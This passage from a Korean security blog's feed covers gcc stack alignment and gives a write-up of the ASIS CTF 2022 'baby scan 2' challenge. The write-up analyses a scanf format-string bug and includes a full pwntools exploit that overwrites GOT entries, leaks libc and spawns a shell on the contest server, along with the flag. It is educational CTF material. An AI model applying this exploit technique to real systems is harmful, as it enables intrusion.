class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0xffffd8fc│+0x0000: 0xffffd908  →  0x00000000← $esp</span><br><span class="line">0xffffd900│+0x0004: 0x00000000</span><br><span class="line">0xffffd904│+0x0008: 0x000040 (&quot;@&quot;?)</span><br><span class="line">0xffffd908│+0x000c: 0x00000000  //&lt;-- 여기서부터 0x40바이트 초기화</span><br><span class="line">0xffffd90c│+0x0010: 0x00000000</span><br><span class="line">0xffffd910│+0x0014: 0x00000000</span><br><span class="line">0xffffd914│+0x0018: 0x00000000</span><br><span class="line">0xffffd918│+0x001c: 0x00000000</span><br><span class="line">0xffffd91c│+0x0020: 0x00000000</span><br><span class="line">0xffffd920│+0x0024: 0x00000000</span><br><span class="line"></span><br><span class="line">0xffffd924│+0x0028: 0x00000000</span><br><span class="line">0xffffd928│+0x002c: 0x00000000</span><br><span class="line">0xffffd92c│+0x0030: 0x00000000</span><br><span class="line">0xffffd930│+0x0034: 0x00000000</span><br><span class="line">0xffffd934│+0x0038: 0x00000000</span><br><span class="line">0xffffd938│+0x003c: 0x00000000</span><br><span class="line">0xffffd93c│+0x0040: 0x00000000</span><br><span class="line">0xffffd940│+0x0044: 0x00000000</span><br><span class="line">0xffffd944│+0x0048: 0x00000000  //&lt;-- 0xffffd908 ~ 0xffffd947 까지 0x40 바이트가 초기화 됨</span><br><span class="line">0xffffd948│+0x004c: 0x00000000← $ebp </span><br><span class="line"></span><br><span class="line">0xffffd94c│+0x0050: 0xf7c1f119  →   add esp, 0x10</span><br><span class="line">0xffffd950│+0x0054: 0x00000001</span><br><span class="line">0xffffd954│+0x0058: 0xffffda04  →  0xffffdb8e  →  &quot;/home/jir4vvit/study/rop32/challr&quot;</span><br><span class="line">0xffffd958│+0x005c: 0xffffda0c  →  0xffffdbb0  →  &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xffffd95c│+0x0060: 0xffffd970  →  0xf7e1fe34  →  0x0021fd4c</span><br><span class="line">0xffffd960│+0x0064: 0xf7e1fe34  →  0x0021fd4c</span><br><span class="line">0xffffd964│+0x0068: 0x80491ee  →  &lt;main+0&gt; push ebp</span><br><span class="line">0xffffd968│+0x006c: 0x00000001</span><br><span class="line">0xffffd96c│+0x0070: 0xffffda04  →  0xffffdb8e  →  &quot;/home/jir4vvit/study/rop32/challr&quot;</span><br><span class="line">0xffffd970│+0x0074: 0xf7e1fe34  →  0x0021fd4c</span><br></pre></td></tr></table></figure><h1 id="More"><a href="#More" class="headerlink" title="More"></a>More</h1><p>참고로 64bit 프로그램에서는 block 단위가 4바이트에서 8바이트로 늘어났기 때문에 <code>-mpreferred-stack-boundary=2</code> 옵션을 사용하려고 하면 에러를 내뿜는다.</p><h3 id="궁금증"><a href="#궁금증" class="headerlink" title="궁금증"></a>궁금증</h3><p>무려 6년 9개월 전 어떤 분이 하신 궁금증과 동일한 궁금증을 가졌다. 안타깝게도 해당 질문에 대한 답은 찾아보기 어려웠다. </p><p>I noticed that when not using -mpreferred-stack-boundary&#x3D;2, gcc might compile “main” with an interesting prologue&#x2F;epilogue: effectively “relying on $ecx (which relies on $ebp-4) for $esp value before ret”. Has anyone else come across this observation?</p><p>This means you can not overwrite normal ret address staying at $ebp+4, but instead you have to overwrite $ebp-4 (that is ecx) and reposition the stack pointer and your return address (effectively using a stack pivot) to further the exploitation.</p><ul><li><a href="https://security.stackexchange.com/questions/110943/how-to-exploit-a-stack-overflow-without-setting-mpreferred-stack-boundary-2">https://security.stackexchange.com/questions/110943/how-to-exploit-a-stack-overflow-without-setting-mpreferred-stack-boundary-2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 32bit </tag>
            
            <tag> stack alignment </tag>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASIS CTF 2022 - baby scan 2 (fsb, scanf)</title>
      <link href="/221018-asisctf2022-babysacn_2/"/>
      <url>/221018-asisctf2022-babysacn_2/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(41&#x2F;532) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>It seems that the app scans every incoming message and simply removes the rude and offending phrase before displaying the original message.</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   └── chall</span><br><span class="line">├── lib</span><br><span class="line">│   ├── ld-2.31.so</span><br><span class="line">│   └── libc.so.6</span><br><span class="line">├── run.sh</span><br><span class="line">└── src</span><br><span class="line">    └── main.c</span><br></pre></td></tr></table></figure><h3 id="making-patched-chall"><a href="#making-patched-chall" class="headerlink" title="making patched chall"></a>making patched chall</h3><p>libc와 ld가 주어졌으니 remote 환경과 동일하게 chall을 구성하기 위해 patch를 진행했다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch bin]$ ldd pchall </span><br><span class="line">linux-vdso.so.1 (0x00007ffc2bd90000)</span><br><span class="line">./../lib/libc.so.6 (0x00007f46adf9f000)</span><br><span class="line">./../lib/ld-2.31.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f46ae193000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(atoi(size) + <span class="number">1</span>); <span class="comment">// difference of babyscan_1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);</span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>baby scan 1</code> 문제와 다른 점은 딱 하나다. <code>size+1</code> 크기를 스택이 아닌 힙에 할당한다. 따라서 <code>baby scan 1</code> 처럼 풀이를 진행한다면 힙 오버플로우가 나타나게 된다. 하지만 이 취약점만으론 익스가 불가능하다. free도 없고 단순히 힙 할당 한 번 가지고는 할 수 있는 게 없다. 힙 오버를 이용해서 다음 chunck의 size를 조절가능하지만 쓸모없다. 그래서 다른 취약점을 찾아야 한다. 이 과정에서 시간을 많이 허비해서 대회 시간 내에 풀지 못하였다.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>동작 과정을 살펴보면서 취약점을 찾아보자.</p><ol><li><p>size에 15글자를 받는다. (16글자가 아니라 15글자다.. 이것 때문에 익스코드 작성할 때 초반에 삽질했다.) <em>&lt;–<code>scanf</code>의 포맷스트링을 여기서 입력해야 한다.</em></p></li><li><p>size+1 만큼 힙 할당을 진행한다. <em>&lt;–사실상 신경안써도 된다.</em></p></li><li><p><code>snprintf</code>를 이용하여 힙 입력에 사용될 <code>scanf</code>의 포맷스트링을 정의한다. <em>&lt;–포맷스트링을 어찌어찌 잘 정의해서</em></p></li><li><p>할당한 힙에 <code>scanf</code>를 이용하여 입력을 진행한다. <em>&lt;–fsb를 트리거해서 원하는 위치에 원하는 값을 적을 수 있다.</em></p></li></ol><p>어떻게 fsb를 트리거할 수 있을까? <code>baby sacn 1</code>을 풀었던 것처럼 <code>0</code>을 입력해서 스택을 살펴보며 생각해보자.</p><p>4번째 과정을 진행할 때 즉, <code>scanf</code>를 이용하여 입력을 진행할 때 arguments는 아래와 같다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffcdabcf878 → 0x00000000733025 (&quot;%0s&quot;?),</span><br><span class="line">   $rsi = 0x0000000172a2a0 → 0x0000000000000000,</span><br><span class="line">   $rdx = 0x0000000172a2a0 → 0x0000000000000000</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>첫 번째 인자에 주목해서 생각을 해보자. 우리는 포맷스트링을 마음대로 집어넣어서 입력할 수 있다. <code>printf</code> 함수에서 포맷스트링을 정의해주지 않고 우리의 입력값만 인자로 들어간다면 fsb를 이용해서 스택을 leak하거나 스택에 원하는 값을 넣을 수 있다.</p><p><code>scanf</code>에서도 똑같이 통하지 않을까? 키보드로부터 입력을 받는 함수니깐 출력은 하지 못하더라도 원하는 스택 주소에 원하는 값을 적을 수 있지 않을까?</p><p>size를 입력 받을 때 15글자를 입력할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanf(&quot;%15s&quot;, size)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/20gx $rsp</span><br><span class="line">0x7ffcdabcf870:0x00007fab4b8902e80x0000000000733025</span><br><span class="line">0x7ffcdabcf880:0x00000000000000300x0000000000401170 &lt;-- [!]</span><br><span class="line">0x7ffcdabcf890:0x00007ffcdabcf9900x000000000172a2a0</span><br><span class="line">0x7ffcdabcf8a0:0x00000000000000000x00007fab4b6c3083</span><br><span class="line">0x7ffcdabcf8b0:0x00000001000000180x00007ffcdabcf998</span><br><span class="line">0x7ffcdabcf8c0:0x000000014b8877a00x0000000000401256</span><br><span class="line">0x7ffcdabcf8d0:0x00000000004013900x03f4474d8e43ddf7</span><br><span class="line">0x7ffcdabcf8e0:0x00000000004011700x00007ffcdabcf990</span><br><span class="line">0x7ffcdabcf8f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffcdabcf900:0xfc0df2347f23ddf70xfca2d195ee2dddf7</span><br></pre></td></tr></table></figure><p>size를 입력할 때 9번째 offset을 컨트롤할 수 있다. 현재는 <code>0x401170</code>이 쓰여있는데, 이거 대신 원하는 got 넣을 수 있다면?</p><p>자자, <em>취약점을 트리거 하기 위해서 우리가 알고 있는 정보</em>를 정리해보자. </p><ol><li><p><code>scanf(fmt, buf)</code>에서 fsb를 트리거할 수 있을 것만 같다.</p></li><li><p>9번째 offset에 입력할 수 있다. 언제? <code>scanf(&quot;%15s&quot;, size)</code>에서.</p></li><li><p><code>fmt</code>는 <code>%&lt;인풋&gt;s</code>이다.</p></li></ol><p>&#x3D;&gt; <code>data</code>를 입력할 때 <code>scanf(&quot;%9$s&quot;, buf)</code>가 되어 원하는 주소에 원하는 값을 쓸 수 있을 것이다. got overwriting이 가능할 것이다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>익스를 위해 ida에서도 살펴보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> fmt[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%15s&quot;</span>, nptr);</span><br><span class="line">  <span class="keyword">if</span> ( ((*__ctype_b_loc())[nptr[<span class="number">0</span>]] &amp; <span class="number">0x800</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = atoi(nptr);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(v3 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="number">8uLL</span>, <span class="string">&quot;%%%ss&quot;</span>, nptr);</span><br><span class="line">  __isoc99_scanf(fmt, v6);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>우리는 현재 특정 함수의 got를 덮을 수 있는데, <code>atoi</code> 함수가 정말정말 너무너무 이것저것하기에 적당해 보인다. (인자를 하나만 받아서..)</p><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>처음에 leak할 때 <code>atoi@got</code>를 <code>puts</code>로 덮어서 릭하려고 했었다. 매우매우매우매우매우 바보같은 생각이었다. leak하고 싶은 주소를 넣어주면 고대로 출력해준다. (…)</p><p>leak할 때도 fsb를 이용해야 한다. 그래서 <code>atoi@got</code>을 <code>printf</code>로 덮고, <code>ntpr</code>에 포맷스트링을 넣어줘야 한다.</p><h3 id="isdigit-bypass"><a href="#isdigit-bypass" class="headerlink" title="isdigit() bypass"></a><code>isdigit()</code> bypass</h3><p>prototype은 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isdigit</span><span class="params">( <span class="type">int</span> arg )</span>;</span><br></pre></td></tr></table></figure><p>parameter로는 <code>char</code>가 들어가야 한다. ‘0’ ~ ‘9’ 의 값만 들어갈 수 있는데, 이 문제에서서는 15글자를 인자로 줄 수 있다.<br>따라서 <code>0&lt;입력&gt;</code> 이런식으로 첫 글자에 숫자 하나를 주고 뒤에 원하는 문자들을 써서 이 검사를 우회할 수 있다.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li><code>exit@got</code>를 <code>main</code> 주소로 덮어 무한히 실행되게 하기</li><li><code>atoi@got</code>를 <code>printf</code> 주소로 덮어 leak할 수 있게 구성하기</li><li><code>0%29$p</code>를 보내서 <code>__libc_start_main - 243</code> leak</li><li><code>system</code> 실제 주소를 구한 후 <code>atoi@got</code>을 덮기</li><li>마지막으로 <code>0;sh</code>를 보내 shell 획득</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pchall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.21.255.31&#x27;</span>, <span class="number">33710</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pchall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./../lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit@got -&gt; main</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;exit&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(e.symbols[&#x27;main&#x27;])</span></span><br><span class="line">payload = p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># atoi@got -&gt; puts</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(e.symbols[<span class="string">&#x27;printf&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">payload = <span class="string">b&#x27;0%29$p&#x27;</span><span class="comment">#b&#x27;9$&#x27;.ljust(8, b&#x27;\x00&#x27;) + p64(e.got[&#x27;atoi&#x27;])[:-1]</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;00x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(<span class="string">b&#x27;0x&#x27;</span> + p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">243</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># atoi@got -&gt; system</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">&#x27;0;sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="data-보낼-때-0-7-로-자른-이유"><a href="#data-보낼-때-0-7-로-자른-이유" class="headerlink" title="data 보낼 때 [0:7]로 자른 이유?"></a><code>data</code> 보낼 때 <code>[0:7]</code>로 자른 이유?</h3><p><code>scanf</code> 함수는 입력할 때 마지막에 Null byte를 삽입한다.<br><code>p64()</code>로 패킹해서 보내게 되면 8바이트를 전송하게 된다. 이때 <code>scanf</code>로 입력을 받았기 때문에 마지막에 Null byte가 추가되어 <code>_ctype_b_loc@got.plt</code>를 더럽혀버렸다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/2gx 0x0000000000404058</span><br><span class="line">0x404058 &lt;exit@got.plt&gt;:0x00000000004012560x00007fba7666d400</span><br><span class="line">gef&gt; x/gx 0x0000000000404058 + 0x8</span><br><span class="line">0x404060 &lt;__ctype_b_loc@got.plt&gt;:0x00007fba7666d400</span><br><span class="line">gef&gt; x/gx 0x00007fba7666d400</span><br><span class="line">0x7fba7666d400 &lt;isspace_l+16&gt;:0x66c3c0b70f200025</span><br></pre></td></tr></table></figure><p>아래가 올바른 경우이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/2gx 0x0000000000404058</span><br><span class="line">0x404058 &lt;exit@got.plt&gt;:0x00000000004012560x00007fdc030534a0</span><br><span class="line">gef&gt; x/gx 0x0000000000404058 + 0x8</span><br><span class="line">0x404060 &lt;__ctype_b_loc@got.plt&gt;:0x00007fdc030534a0</span><br><span class="line">gef&gt; x/gx 0x00007fdc030534a0</span><br><span class="line">0x7fdc030534a0 &lt;__ctype_b_loc&gt;:0x5d058b48fa1e0ff3</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASIS&#123;fd408e00d5824d7220c4d624f894144e&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> scanf </tag>
            
            <tag> ASIS CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASIS CTF 2022 - baby scan 1</title>
      <link href="/221017-asisctf2022-babysacn_1/"/>
      <url>/221017-asisctf2022-babysacn_1/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(87&#x2F;532) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Is it possible to scan the thousands of resulting strings by hand? We think it’s tedious, but will get the job done!</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   └── chall</span><br><span class="line">├── lib</span><br><span class="line">│   ├── ld-2.31.so</span><br><span class="line">│   └── libc.so.6</span><br><span class="line">├── run.sh</span><br><span class="line">└── src</span><br><span class="line">    └── main.c</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 